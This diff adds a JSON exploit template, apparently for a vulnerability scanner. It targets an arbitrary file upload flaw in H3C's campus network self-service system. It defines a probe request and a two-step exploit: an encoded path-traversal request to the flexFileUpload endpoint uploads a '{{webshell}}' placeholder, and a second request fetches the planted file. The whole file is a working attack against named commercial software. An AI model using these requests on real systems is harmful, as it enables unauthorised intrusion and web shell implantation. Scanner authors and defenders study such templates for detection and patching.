@@ -1,0 +1,42 @@
+{
+	"name":"H3C-校园网自助服务系统flexfileupload任意文件上传",
+	"tag":"h3c",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/imc/primepush/%2e%2e/flexFileUpload",
+		"pocPost":"-----------------WebKitFormBoundaryMmx988TUuintqO4Q\r\nContent-Disposition: form-data; name=\"123.txt\"; filename=\"123.txt\"\r\nContent-Type: application/octet-stream\r\nContent-Length: 255\r\n\r\n1111\r\n-----------------WebKitFormBoundaryMmx988TUuintqO4Q--",
+		"header":{
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
+			"Connection":" close",
+			"Accept-Encoding":" gzip",
+			"Content-Length":" 243",
+			"Content-Type":" multipart/form-data; boundary=---------------WebKitFormBoundaryMmx988TUuintqO4Q"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/imc/primepush/%2e%2e/flexFileUpload",
+			"expPost":"-----------------WebKitFormBoundaryMmx988TUuintqO4Q\r\nContent-Disposition: form-data; name=\"24k.txt\"; filename=\"123.txt\"\r\nContent-Type: application/octet-stream\r\nContent-Length: 255\r\n\r\n{{webshell}}\r\n-----------------WebKitFormBoundaryMmx988TUuintqO4Q--",
+			"header":{
+				"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
+				"Connection":" close",
+				"Accept-Encoding":" gzip",
+				"Content-Length":" 243",
+				"Content-Type":" multipart/form-data; boundary=---------------WebKitFormBoundaryMmx988TUuintqO4Q"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		},
+		"step2":{
+			"expGet":"/imc/primepush/%2e%2e/flex/topobg/24k.txt",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
